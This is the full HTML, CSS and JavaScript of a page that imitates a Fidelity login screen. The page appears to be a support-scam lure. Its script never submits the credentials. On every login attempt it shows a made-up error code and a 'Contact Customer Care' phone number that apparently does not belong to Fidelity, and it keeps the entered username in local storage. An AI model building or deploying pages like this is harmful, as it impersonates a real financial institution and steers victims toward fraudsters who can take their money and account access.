<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fidelity Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            flex-direction: column;
        }

        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }

        .container h2 {
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .login-btn {
            width: 100%;
            background-color: #28a745;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-btn:hover {
            background-color: #218838;
        }

        .forgot-password {
            display: block;
            margin-top: 15px;
            text-align: left;
        }

        .forgot-password a {
            color: black;
            text-decoration: underline;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .footer-links {
            text-align: right;
            margin-top: 20px;
        }

        .footer-links a {
            color: black;
            margin-left: 20px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
        }

        .signup-link a {
            color: black;
            text-decoration: underline;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .feedback {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background-color: #e4f4e8;
            padding: 5px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
            color: #007b55;
            writing-mode: vertical-lr;
            text-align: center;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
        }

        .logo img {
            width: 150px;
        }

        .error {
            color: red;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <header>
    <div class="header-container">
        <div class="logo">
            <img src="fidelity-vector-logo-small.png" alt="Fidelity Logo">
        </div>
        <div class="header-links">
            <a href="#">Security</a>
            <a href='#'>FAQs</a>
        </div>
    </div>
</header>

    
    <div class="container">
        <h2>Log in</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password">
                <div id="error-message" class="error"></div> <!-- Error message block -->
            </div>
            <div class="form-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember my username</label>
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div class="forgot-password">
                <a href="#">Forgot username or password?</a>
            </div>
        </form>
    </div>

    <!-- Signup link outside the container -->
    <div class="signup-link">
        New to Fidelity? <a href="#">Open an account or sign up.</a>
    </div>

    <script>
        // Function to save username to localStorage if "Remember my username" is checked
        function saveUsername() {
            const username = document.getElementById('username').value;
            const remember = document.getElementById('remember').checked;

            if (remember) {
                localStorage.setItem('rememberedUsername', username);
            } else {
                localStorage.removeItem('rememberedUsername');
            }
        }

        // Function to populate the username field if it was remembered
        function loadRememberedUsername() {
            const rememberedUsername = localStorage.getItem('rememberedUsername');
            if (rememberedUsername) {
                document.getElementById('username').value = rememberedUsername;
                document.getElementById('remember').checked = true;
            }
        }

        // Show error message on login attempt
        function showErrorMessage() {
            const errorMessage = document.getElementById('error-message');
            errorMessage.innerHTML = 'Error Code : 00X47800 <br> Contact Customer Care : +1-844-499-1812';
        }

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Show error message every time login is attempted
            showErrorMessage();

            // Save the username if remember is checked
            saveUsername();
        });

        // Load remembered username on page load
        window.onload = function() {
            loadRememberedUsername();
        };
    </script>
</body>
</html>
